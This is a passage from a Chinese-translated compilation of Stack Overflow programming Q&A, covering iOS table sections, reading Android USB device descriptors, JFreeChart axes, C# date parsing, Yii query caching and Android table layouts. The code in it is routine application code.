    UITableViewCell *cell1 = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    //heigh does not change -.-
    if (cell1 == nil){
        cell1 = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }
    return cell1;
}
else {
static NSString *CellIdentifier = @"FirstCell";
UITableViewCell *cell1 = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

if (cell1 == nil){
    cell1 = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
}
cell1.textLabel.text = [[articles objectAtIndex:indexPath.row]objectForKey:labelkey1]; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T10:31:13.393

它们是节标题。

您可以通过添加此方法来添加节标题：

```
- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section
{ 
     return @"My title";
} 
```

要添加多个部分，您需要从以下方法传递一个合适的值：

```
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 7;
} 
```

传递每个部分的行数：

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
   return 2;
} 
```

**从上面的代码中，您将获得 7 个部分，每个部分有 2 行。您需要相应地处理部分、行及其数据。**

> **表视图：titleForHeaderInSection：**
> 
> 向数据源询问表视图指定部分的标题标题。- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section 参数
> 
> 表视图
> 
> ```
> The table-view object asking for the title.  section
> 
> An index number identifying a section of tableView . 
> ```
> 
> 返回值
> 
> 用作节标题标题的字符串。如果您返回 nil ，该部分将没有标题。讨论
> 
> 表格视图对节标题标题使用固定的字体样式。如果您想要不同的字体样式，请改为在委托方法 tableView:viewForHeaderInSection: 中返回自定义视图（例如，UILabel 对象）。可用性
> 
> ```
> Available in iOS 2.0 and later. 
> ```
> 
> 也可以看看
> 
> ```
> – tableView:titleForFooterInSection: 
> ```
> 
> 在 UITableView.h 中声明

参考 ：

1.  [UITableView 数据源](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITableViewDataSource_Protocol/Reference/Reference.html#//apple_ref/occ/intf/UITableViewDataSource)
2.  [UITableView](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITableView_Class/Reference/Reference.html)

# android - 安卓中的USB接口

> ID：13217755
> 
> 赞同：6
> 
> 时间：2012-11-04T10:27:44.280
> 
> 标签：android, usb

我植根了我的设备并在主机模式下工作。我可以检测到连接到我的标签的 USB 设备，但我有两个问题。

1) 我尝试使用 device.getDeviceName() 显示我的设备名称；但它显示类似 /dev/usb/002/002 我需要获取 USB 设备名称的制造商名称。我认为它在附件模式下可用，但我需要在主机模式下获取制造商名称。

2）我需要将一些数据从我的应用程序传输到 android 的 USB 端口。我可以检测到该设备，但请帮助将一些数据或文件从我的 android 应用程序传输到连接到 USB 端口的大容量存储器。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-12-03T06:50:10.110

可能您实际上需要阅读原始 USB 描述符来获取您想要的数据。这是我为自己的目的编写的基本 USB 设备发现程序。请注意，我正在寻找特定设备（Dajac Easy I/O 1000 数据采集系统），但您可以应用相同的原理。我会向您展示如何获取您正在寻找的数据。

这里首先是代码。我的包是usbtest3，文件是MainActivity.java：

```
package com.hotspotoffice.usbtest3;

// David Schofield, Hotspot Office, LLC., Pittsburgh, PA.
// Donations via PayPal always welcome! schofield (dot) david (at) verizon.net

import java.io.UnsupportedEncodingException;
import java.util.HashMap;
import java.util.Iterator;
import android.os.Bundle;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.view.View;
import android.view.Menu;
import android.widget.Button;
import android.widget.TextView;
import android.hardware.usb.UsbConstants;
import android.hardware.usb.UsbManager;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbInterface;

public class MainActivity extends Activity {

    protected static final int STD_USB_REQUEST_GET_DESCRIPTOR = 0x06;
    // http://libusb.sourceforge.net/api-1.0/group__desc.html
    protected static final int LIBUSB_DT_STRING = 0x03;
    private static final String ACTION_USB_PERMISSION = "com.android.example.USB_PERMISSION";

    private Button btnDiscover;
    private TextView txtInfo;
    private PendingIntent mPermissionIntent; 

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnDiscover=(Button)findViewById(R.id.btnDiscover);
        txtInfo=(TextView)findViewById(R.id.txtInfo);

        mPermissionIntent = PendingIntent.getBroadcast(this, 0, new Intent(ACTION_USB_PERMISSION), 0);
        IntentFilter filter = new IntentFilter(ACTION_USB_PERMISSION);
        registerReceiver(mUsbReceiver, filter);

        btnDiscover.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                // txtInfo.setText("Button has been Pressed for "+(++i)+" Times.");

                UsbManager manager = (UsbManager)getSystemService(Context.USB_SERVICE);

                HashMap<String, UsbDevice> deviceList = manager.getDeviceList();
                Iterator<UsbDevice> deviceIterator = deviceList.values().iterator();
                while(deviceIterator.hasNext()){
                    UsbDevice device = deviceIterator.next();

                    manager.requestPermission(device, mPermissionIntent);

                    txtInfo.append("Model:" + device.getDeviceName() + "\n");  
                    txtInfo.append("DeviceID:" + device.getDeviceId() + "\n");
                    txtInfo.append("Vendor:" + device.getVendorId() + "\n");
                    txtInfo.append("Product:" + device.getProductId() + "\n");
                    txtInfo.append("Class:" + device.getDeviceClass() + "\n");
                    txtInfo.append("Subclass:" + device.getDeviceSubclass() + "\n");
                    txtInfo.append("Protocol:" + device.getDeviceProtocol() + "\n");

                    UsbInterface intf = device.getInterface(0);
                    int epc = 0;
                    epc = intf.getEndpointCount();
                    txtInfo.append("Endpoints:" + epc + "\n");

                    txtInfo.append("Permission:" + Boolean.toString(manager.hasPermission(device))  + "\n");

                    UsbDeviceConnection connection = manager.openDevice(device);
                    if(null==connection){
                        txtInfo.append("(unable to establish connection)\n");
                    } else {

                        // Claims exclusive access to a UsbInterface. 
                        // This must be done before sending or receiving data on 
                        // any UsbEndpoints belonging to the interface.
                        connection.claimInterface(intf, true);

                        // getRawDescriptors can be used to access descriptors 
                        // not supported directly via the higher level APIs, 
                        // like getting the manufacturer and product names.
                        // because it returns bytes, you can get a variety of
                        // different data types.
                        byte[] rawDescs = connection.getRawDescriptors();
                        String manufacturer = "", product = "";

                        try
                        {
                            byte[] buffer = new byte[255];
                            int idxMan = rawDescs[14];
                            int idxPrd = rawDescs[15];

                            int rdo = connection.controlTransfer(UsbConstants.USB_DIR_IN
                                    | UsbConstants.USB_TYPE_STANDARD, STD_USB_REQUEST_GET_DESCRIPTOR,
                                    (LIBUSB_DT_STRING << 8) | idxMan, 0, buffer, 0xFF, 0);
                            manufacturer = new String(buffer, 2, rdo - 2, "UTF-16LE");

                            rdo = connection.controlTransfer(UsbConstants.USB_DIR_IN
                                            | UsbConstants.USB_TYPE_STANDARD, STD_USB_REQUEST_GET_DESCRIPTOR,
                                    (LIBUSB_DT_STRING << 8) | idxPrd, 0, buffer, 0xFF, 0);
                            product = new String(buffer, 2, rdo - 2, "UTF-16LE");

                        } catch (UnsupportedEncodingException e)
                        {
                        e.printStackTrace();
                        }

                        txtInfo.append("Manufacturer:" + manufacturer + "\n");                      
                        txtInfo.append("Product:" + product + "\n");                        
                        txtInfo.append("Serial#:" + connection.getSerial() + "\n");                     
                    }

                    txtInfo.append("------------------------------------\n");                   
                }               

            }
        });

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

    private final BroadcastReceiver mUsbReceiver = new BroadcastReceiver() {

        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (ACTION_USB_PERMISSION.equals(action)) {
                synchronized (this) {
                    UsbDevice device = (UsbDevice)intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);

                    if (intent.getBooleanExtra(UsbManager.EXTRA_PERMISSION_GRANTED, false)) {
                        if(device != null){
                          //call method to set up device communication
                       }
                    } 
                    else {
                        txtInfo.append("permission denied for device " + device);
                    }
                }
            }
        }
    };

} 
```

我的清单文件包含 USB 主机设备支持的意图和要求：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.hotspotoffice.usbtest3"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-feature android:name="android.hardware.usb.host" />

    <uses-sdk
        android:minSdkVersion="15"
        android:targetSdkVersion="15" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >

        <activity
            android:name="com.hotspotoffice.usbtest3.MainActivity"
            android:label="@string/app_name" >

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>

            <intent-filter>
                <action android:name="android.hardware.usb.action.USB_DEVICE_ATTACHED" />
            </intent-filter>

            <meta-data android:name="android.hardware.usb.action.USB_DEVICE_ATTACHED"
                android:resource="@xml/device_filter" />

        </activity>
    </application>

</manifest> 
```

最后，您将需要一个设备过滤器。它位于 \res\xml\device_filter.xml 下 请注意，我必须自己在 \res 下创建 xml 文件夹。

```
<?xml version="1.0" encoding="utf-8"?>

<resources>
    <usb-device vendor-id="7635" product-id="1" class="255" subclass="255" protocol="0" />
</resources> 
```

请注意，所有字段都必须是十进制，而不是十六进制。您需要用您自己的设备替换您自己的供应商、产品、类和子类值。您可以使用“USB 主机视图”或“USB 设备信息”之类的程序来发现这些值。（从 Play 商店免费下载。）

最后，这是我在 Activity_Main.xml 中定义用户界面的方式。
您至少需要 Discover 按钮和用于输出的 TextMultiline。（忽略 Init 和 On/Off 按钮。）

顺便说一句，我使用的是 10 英寸东芝 Thrive 平板电脑，所以 YMMV。

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity" >

    <EditText
        android:id="@+id/txtInfo"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignLeft="@+id/btnDiscover"
        android:layout_alignRight="@+id/textView1"
        android:layout_centerVertical="true"
        android:ems="10"
        android:inputType="textMultiLine"
        android:maxLines="50"
        android:minLines="20"
        android:minWidth="400dp" >

        <requestFocus />
    </EditText>

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_above="@+id/btnToggleDIO"
        android:layout_marginLeft="192dp"
        android:layout_toRightOf="@+id/btnDiscover"
        android:text="@string/lblDIO"
        android:textAppearance="?android:attr/textAppearanceMedium" />

    <Button
        android:id="@+id/btnDiscover"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignBaseline="@+id/btnInit"
        android:layout_alignBottom="@+id/btnInit"
        android:layout_alignParentLeft="true"
        android:layout_marginLeft="73dp"
        android:text="@string/strDiscover" />

    <ToggleButton
        android:id="@+id/btnToggleDIO"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignBaseline="@+id/btnInit"
        android:layout_alignBottom="@+id/btnInit"
        android:layout_alignLeft="@+id/textView1"
        android:text="@string/strIOState" />

    <Button
        android:id="@+id/btnInit"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_above="@+id/txtInfo"
        android:layout_marginBottom="29dp"
        android:layout_marginLeft="48dp"
        android:layout_toRightOf="@+id/btnDiscover"
        android:text="@string/strInit" />

</RelativeLayout> 
```

当我运行我的程序并插入我的设备时，它会询问我是否允许连接，然后我说“Ok”。然后我点击发现，它告诉我制造商是“Dajac Inc.”。产品为“EIO1000”，序列号为“0000004B”。

祝你好运；你可以给我荣誉，但只有站在别人的肩膀上（我自己的汗水很多）我才能看到这么远。转发过去！-大卫

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-11-21T09:19:11.203

上面的代码适用于除三星移动设备之外的大多数设备。为了让他们提供语言 ID，否则你会遇到麻烦。

```
int rdo = connection.controlTransfer(UsbConstants.USB_DIR_IN
| UsbConstants.USB_TYPE_STANDARD, STD_USB_REQUEST_GET_DESCRIPTOR,
(LIBUSB_DT_STRING << 8) | idxMan, 0x0409, buffer, 0xFF, 0); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-04T12:43:01.240

> 设备名称

这看起来像 Linux 内核中的内部设备名称。

> 生产商名称

您只能通过 USB `VID`（供应商 ID）间接获得此信息。它们由[USB-IF](http://www.usb.org/developers/usbfaq#12)分配和维护。

设备可以在其字符串描述符中为制造商提供名称，但 AFAIK 这是可选的 - 并且不会在高级 android java 接口中公开。

您可以使用[UsbDeviceConnection.getRawDescriptors](http://developer.android.com/reference/android/hardware/usb/UsbDeviceConnection.html#getRawDescriptors%28%29)试试运气，但这需要相当丑陋的字节摆弄。

> 到大容量存储

USB 大容量存储是一个相当复杂的协议，因此直接通过 USB 主机 API 进行通信将很难实现。一些安卓固件镜像可以挂载U盘，这样会简单*很多*。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-10-11T07:45:43.727

只是对上述代码的一个小注释，原则上它工作得很好。请求用户访问 USB 设备的权限是一个异步调用。因此，如果该特定设备（尚）没有权限，则代码不应继续执行。

请允许我对 onClick 和 onReceive 方法做一个小的更新：

```
 Button btnDiscover = (Button) findViewById(R.id.buttonDiscover);
    btnDiscover.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            txtInfo.setText("");
            HashMap<String, UsbDevice> deviceList = manager.getDeviceList();
            for (UsbDevice device : deviceList.values()) {
                Log.i("discover", "Model    :" + device.getDeviceName());
                if (!manager.hasPermission(device)) {
                    Log.i("discover", "No permission to access, so requesting it now from user (async)");
                    manager.requestPermission(device, mPermissionIntent);
                } else {
                    showUsbDetails(device);
                }
            }
        }
    });

private final BroadcastReceiver mUsbReceiver = new BroadcastReceiver() {
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (MainActivity.ACTION_USB_PERMISSION.equals(action)) {
            Log.i("BroadcastReceiver", "onReceive: ACTION_USB_PERMISSION");
            synchronized (this) {
                UsbDevice device = intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);
                if (intent.getBooleanExtra(UsbManager.EXTRA_PERMISSION_GRANTED, false)) {
                    if(device != null){
                        showUsbDetails(device);
                    }
                }
                else {
                    txtInfo.append("permission denied for device " + device);
                }
            } 
```

不用说，showUsbDetails 现在包含原始代码中与 USB 设备进行通信以查询制造商和其他字符串的部分。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-13T14:55:15.443

1.  getVendorId() 应该给你制造商的名字。其他调用包括 getDeviceName()、getDeviceId()、getDeviceClass()、getDeviceSubclass()、getDeviceProtocol()、getProductId()。 [参考这个链接：Android USB Host](http://developer.android.com/reference/android/hardware/usb/UsbDevice.html)

2.  对于数据传输，[请参阅此链接： BulkTransfer](http://developer.android.com/reference/android/hardware/usb/UsbDeviceConnection.html)。从缓冲区中的文件读取并将缓冲区连同设备的特定输出端点和数据长度一起传递给 bulkTransfer 调用。

# jfreechart - JFreechart - 获取当前显示数据集的最小值和最大值以自动调整 y 轴

> ID：13217759
> 
> 赞同：1
> 
> 时间：2012-11-04T10:29:00.870
> 
> 标签：jfreechart

我对使用 JFreeChart 创建的图表的移动导航有疑问。从库源代码中包含的示例来看，当我们在图表上进行缩放或移动时，图表可以自由移动。但我目前正在尝试做的是与实际交易平台类似的行为，比如 Metatrader (MT4)。当图表向左/向右移动时，数据集的最小值/最大值在变化，因此图表的 y 轴也会相应更新。基本上我知道如何使用以下代码更改 y 轴的范围：

```
ValueAxis y_range = plot.getRangeAxis(); range.setRange(min, max); 
```

但现在我的问题是获取最小/最大值，我认为它现在应该来自屏幕上当前可见的数据集。

任何人都知道如何获取图表当前可见数据集的最小值/最大值？我目前拥有的信息是完整的数据集。我已经探索了一些与 JFreeChart 相关的论坛，并且一些建议使用以下内容：

```
static Range    findDomainBounds(XYDataset dataset) 
```

但如果我使用我的数据集，它将是整个数据集的最小值/最大值。如果这是获取我需要的信息的唯一方法，知道如何获取当前可见图表的数据集的唯一部分吗？（不是整个数据集）

非常感谢您的帮助！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T13:07:24.463

目前尚不清楚`XYDataset`您正在使用哪个，但您始终可以扩展`AbstractXYDataset`，如此处所示[，](https://stackoverflow.com/a/12481509/230513)以获得您当前选择的轴范围的最小值/最大值。

# background-image - App Inventor 的应用程序会根据屏幕大小调整背景图像和其他内容的大小

> ID：13217760
> 
> 赞同：4
> 
> 时间：2012-11-04T10:29:07.290
> 
> 标签：background-image, autoresize, screen-size, app-inventor

我正在与应用程序发明者一起编程，我希望我的应用程序支持所有屏幕分辨率和纵横比以及背景图像和其他内容根据屏幕大小调整大小。我怎样才能做到这一点？

更具体地说，我有一个画布填充父级，我希望这个画布填充的背景图像也是父级，但我只能按像素设置这个图像的大小。有人能帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T20:18:27.240

你说，你设置画布的宽度和高度来填充父母。为确保这也适用于高度，请将 screen.scrollable 设置为 false 并在您的设备上进行测试。

屏幕截图设计器窗口
![在此处输入图像描述](../Images/be1f5484cbc63fb6795ce22d8d56a6f9.png)

截图设备

![截屏](../Images/283fff7a85f933cbdd65787f6364d34c.png)

# c - C中的线程间通信

> ID：13217761
> 
> 赞同：0
> 
> 时间：2012-11-04T10:29:31.910
> 
> 标签：c, multithreading, pthreads

作为我项目的一部分，我必须使用线程修改数值积分算法。

这大致是在传统的顺序方法中发生的事情。

```
void Controller(struct DE)
{
    //initialization step
    for(;;)   //till the entire range has not been covered...
    {
         //compute the next time-point solution using the previously known solutions.
         NIiter();
         //then check if the result is acceptable or not and take the necessary steps...
    }
} 
```

现在这就是我打算做的......

```
void Controller(struct DE)
{
    //initialization step
    for(;;)   //till the entire range has been covered...
    {
         //compute the next time using the previously known solution.
         NIiter();
         //when I have an approximate solution available..launch a thread to compute the next time-point using this approximate solution as a previous solution...something like forward pipelining...
         //then check if BOTH the results are acceptable or not and take the necessary steps...
    }
} 
```

但我不明白如何通知我的控制器有一个近似的解决方案可用......所以它可以启动一个新线程......

这是我第一次接触多线程编程......如果这似乎是一个明显的问题，请原谅我......我也在我的项目中使用 Pthread 库......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:36:48.197

这是一个很大的话题，但这里有一些提示

1.  [工作线程](http://en.wikipedia.org/wiki/Thread_pool_pattern)- 基本上是创建一堆线程并有一个任务队列。他们排在队列中的一个并完成工作
2.  IPC - 这里有信号量、共享内存、消息传递。链接在[页面上](http://en.wikipedia.org/wiki/Thread_pool_pattern)

Wikipedia 将助您一臂之力。

# c# - 为什么 TryParseExact 在此示例中不起作用？

> ID：13217763
> 
> 赞同：3
> 
> 时间：2012-11-04T10:29:54.840
> 
> 标签：c#, .net, datetimeoffset, tryparse

我无法完成这项工作 - 它总是返回 False。

我在这里想念什么？

```
DateTimeOffset parsedDate;

if ( DateTimeOffset.TryParseExact("2012-10-31 23:59:59", "YYYY-MM-dd HH:mm:ss"
                      , CultureInfo.InvariantCulture
                      , DateTimeStyles.None, out parsedDate) == false)
{
   throw new ArgumentException("dateToPare", dateToParse);
} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-04T10:37:08.227

`yyyy`[根据MSDN](http://msdn.microsoft.com/en-us/library/c6dw49cz%28v=vs.71%29.aspx)，应该小写。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-04T10:36:58.650

尝试将年份作为“yyyy” - 小写

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-04T10:59:11.260

试试这个：

```
[TestCase("2012-10-31 10:59:59", 2012, 10, 31, 10, 59, 59)]
[TestCase("2012-10-31 23:59:59", 2012, 10, 31, 23, 59, 59)]
public void ParseExactTest2(string dateTimeString, int year, int month, int day, int hour, int minute, int second)
{
    DateTime actual = DateTime.ParseExact(dateTimeString, "yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture, DateTimeStyles.None);
    DateTime expected = new DateTime(year, month, day, hour, minute, second);
    Assert.AreEqual(expected, actual);
} 
```

正如所指出的：yyyy 必须小写。如果要抛出异常，另一种方法是使用 ParseExact 而不是 TryParseExact。使用 ParseExact，您可以免费获得框架抛出的正确异常。也许尝试抓住它并将你的argumentexception与parseexception作为innerexception一起抛出。

# c++ - 如何实现在同一执行上下文中执行的计时器回调

> ID：13217766
> 
> 赞同：0
> 
> 时间：2012-11-04T10:30:28.930
> 
> 标签：c++, timer, thread-safety

一些编程环境（例如 C++ builder）具有带有回调函数的计时器组件，该回调函数在与创建计时器对象的位置相同的执行上下文中执行。

我想知道如何在纯 c++ 中使用线程做类似的事情。或者有没有其他方法可以定期调用回调来执行某些任务并在与调用线程相同的执行上下文中运行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T13:42:36.627

线程是否可以在其自己的上下文中处理计时器回调完全取决于计时器到期如何与线程通信。线程必须在接收到一些线程间通信时自己调用回调（例如，当 Windows GUI 线程等待其 Windows 消息队列输入时，它接收到 WM_TIMER 消息）。如果线程不等待输入，它不能处理来自任何类型定时器的任何线程间通信，因此不能在它自己的上下文中调用任何定时器处理程序回调。

Forms.Timer、C++ builder Timer 组件和其他类似的方法是安排基于间隔的线程间通知 - 如果线程没有主动等待和处理这些通知，则在该线程的上下文中不会有计时器回调.

# caching - Yii - 数据库依赖缓存是否适用于多个操作？

> ID：13217770
> 
> 赞同：5
> 
> 时间：2012-11-04T10:30:49.303
> 
> 标签：caching, yii

以这段代码为例：

```
public function actionPostOneWay( $postId )
{
    $dependency = new CDbCacheDependency( 'SELECT publish_date FROM posts WHERE id = :post_id;' );
    $dependency->params = array( 'post_id'=>$postId );
    $post = Post::model()->cache( 59, $dependency )->findByPk( $postId );

    // process post one way
}

public function actionPostAnotherWay( $postId )
{
    $dependency = new CDbCacheDependency( 'SELECT publish_date FROM posts WHERE id = :post_id;' );
    $dependency->params = array( 'post_id'=>$postId );
    $post = Post::model()->cache( 59, $dependency )->findByPk( $postId );

    // process post another way
} 
```

那么访问`/postOneWay`和`/postAnotherWay`重用同一个缓存对象，还是他们会创建自己的缓存对象？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T19:33:00.613

我试图在两个不同的操作中缓存相同的查询，是的，将使用相同的缓存对象。`CProfileLogRoute`可以在应用程序的配置文件中看到启用。

查看`CActiveRecord`类的源代码，我声明`public function findByPk($pk,$condition='',$params=array())`方法（和其他查询方法）使用`protected function query($criteria,$all=false)`. 反过来，这最终依赖于Yii 使其缓存与数据库查询一起工作`private function queryInternal($method,$mode,$params=array())`的类。`CDbCommand`

可以看到用于存储和恢复查询结果的缓存键定义如下：

```
$cacheKey='yii:dbquery'.$this->_connection->connectionString.':'.$this->_connection->username;
$cacheKey.=':'.$this->getText().':'.serialize(array_merge($this->_paramLog,$params));
if(($result=$cache->get($cacheKey))!==false)
{
    Yii::trace('Query result found in cache','system.db.CDbCommand');
    return $result;
} 
```

该键不考虑缓存依赖实例。`CDbCacheDependency`仅用于确定数据库中是否发生了某些更改，并执行新查询以更新缓存。多说 - 如果您指定不同的 SQL 以`CDbCacheDependency`在两个操作中创建，则只有其中一个（首先执行）将在缓存期间有意义，因为实例`CDbCacheDependency`与查询的结果一起被序列化缓存：

```
if(isset($cache,$cacheKey))
    $cache->set($cacheKey, $result, $this->_connection->queryCachingDuration, $this->_connection->queryCachingDependency); 
```

`public function set($id,$value,$expire=0,$dependency=null)`在类的方法中可以看到缓存评估依赖项的实例`CCache`：

```
if ($dependency !== null && $this->serializer !== false)
    $dependency->evaluateDependency();

if ($this->serializer === null)
    $value = serialize(array($value,$dependency));
elseif ($this->serializer !== false)
    $value = call_user_func($this->serializer[0], array($value,$dependency)); 
```

# android - Android应用程序在表格布局中动态添加行给出错误

> ID：13217771
> 
> 赞同：1
> 
> 时间：2012-11-04T10:31:10.677
> 
> 标签：android

Java代码——

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONStringer;
import android.os.AsyncTask;
import android.os.Bundle;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.graphics.Color;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup.LayoutParams;
import android.widget.TableLayout;
import android.widget.TableRow;
import android.widget.TextView;
import android.widget.Toast;
import android.support.v4.app.NavUtils;
public class DisplayStore extends Activity {
// Progress Dialog
private ProgressDialog pDialog;
static InputStream is = null;
static JSONObject jObj = null;
static String json = "";
// Creating JSON Parser object
//JSONParser jParser = new JSONParser();
ArrayList<HashMap<String, String>> ContriList;
// url to get all products list
private static String url_get_contri =     "http://10.0.2.2/annapurna_connect/GetContri.php";

// JSON Node names
private static final String TAG_SUCCESS = "success";
/*  private static final String TAG_PRODUCTS = "products";
private static final String TAG_PID = "pid";
private static final String TAG_NAME = "name";*/
// products JSONArray
JSONArray products = null;
@SuppressLint({ "NewApi", "NewApi" })
@Override
public void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_display_store);
getActionBar().setDisplayHomeAsUpEnabled(true);
ContriList = new ArrayList<HashMap<String, String>>();
Toast.makeText(getApplicationContext(), url_get_contri,Toast.LENGTH_LONG).show();
new LoadContri().execute();
}

/**
* Background Async Task to Load all product by making HTTP Request
* */
class LoadContri extends AsyncTask<String, String, String> {
/**
* Before starting background thread Show Progress Dialog
* */
protected void onPreExecute() {
super.onPreExecute();
Toast.makeText(getApplicationContext(), "here i am",Toast.LENGTH_LONG).show();
pDialog = new ProgressDialog(DisplayStore.this);
pDialog.setMessage("Loading Information. Please wait...");
pDialog.setIndeterminate(false);
pDialog.setCancelable(false);
pDialog.show();
}
/**
* getting All products from url
* */
@SuppressWarnings("deprecation")
protected String doInBackground(String... args) {
// Building Parameters
try {

List<NameValuePair> params = new ArrayList<NameValuePair>();
DefaultHttpClient httpClient = new DefaultHttpClient();
String paramString = URLEncodedUtils.format(params, "utf-8");
url_get_contri += "?" + paramString;
HttpGet httpGet = new HttpGet(url_get_contri);
HttpResponse httpResponse = httpClient.execute(httpGet);
HttpEntity httpEntity = httpResponse.getEntity();
is = httpEntity.getContent();

}
catch (UnsupportedEncodingException e) {
e.printStackTrace();
} catch (ClientProtocolException e) {
e.printStackTrace();
} catch (IOException e) {
e.printStackTrace();
}
try {
BufferedReader reader = new BufferedReader(new InputStreamReader(is, "iso-8859-1"), 8);
StringBuilder sb = new StringBuilder();
String line = null;
while ((line = reader.readLine()) != null) {
sb.append(line + "\n");
}
is.close();
json = sb.toString();
} catch (Exception e) {
Log.e("Buffer Error", "Error converting result " + e.toString());
}
/*catch (UnsupportedEncodingException e) {
e.printStackTrace();
} catch (ClientProtocolException e) {
e.printStackTrace();
} catch (IOException e) {
e.printStackTrace();
}*/

// Log.d("checking",sb);    
// Check your log cat for JSON reponse
Log.d("All Products: ",json);
String category,type,city,state,abc;
String test="";
int serves;
try
{
//String json=sb.toString();
// String result=json_decode(json);
// String test="";
JSONArray jArray = new JSONArray(json);
test+="here";
JSONObject json_data=null;
test+="here1";
TableLayout tv=(TableLayout)findViewById(R.id.Table);
tv.removeAllViewsInLayout();
int flag=1;
test+="here2";

for(int i=-1;i<jArray.length();i++){

Log.d("i",String.valueOf(i));
TableRow tr=new TableRow(getApplicationContext());
tr.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));
test+="here4";
if(flag==1)
// this will be executed once
{
test+="here5";
TextView b3=new TextView(getApplicationContext());
b3.setText("Category");
b3.setTextColor(Color.BLUE);
b3.setTextSize(15);
tr.addView(b3);

TextView b4=new TextView(getApplicationContext());
b4.setPadding(10, 0, 0, 0);
b4.setTextSize(15);
b4.setText("Type");
b4.setTextColor(Color.BLUE);
tr.addView(b4);
test+="after1col";
TextView b5=new TextView(getApplicationContext());
b5.setPadding(10, 0, 0, 0);
b5.setText("Serves");
b5.setTextColor(Color.BLUE);
b5.setTextSize(15);
tr.addView(b5);

TextView b6=new TextView(getApplicationContext());
b6.setText("City");
b6.setTextColor(Color.BLUE);
b6.setTextSize(15);
tr.addView(b6);
TextView b7=new TextView(getApplicationContext());
b7.setText("State");
b7.setTextColor(Color.BLUE);
b7.setTextSize(15);
tr.addView(b7);
test+="heresettext";
tv.addView(tr);
test+="aftertv";
final View vline = new View(getApplicationContext());
test+="aftervline";
vline.setLayoutParams(new TableRow.LayoutParams(TableRow.LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));
test+="afterlayout";
vline.setBackgroundColor(Color.BLUE);
test+="aftersetback";
tv.addView(vline); // add line below heading
//tv.addView(tr,new TableLayout.LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));
test+="addview";
flag=0;
test+="aftersettext";
Log.d("check","here");

}
else
{ Log.d("check","here");

test+="here6";
json_data = jArray.getJSONObject(i);
test+="here7";

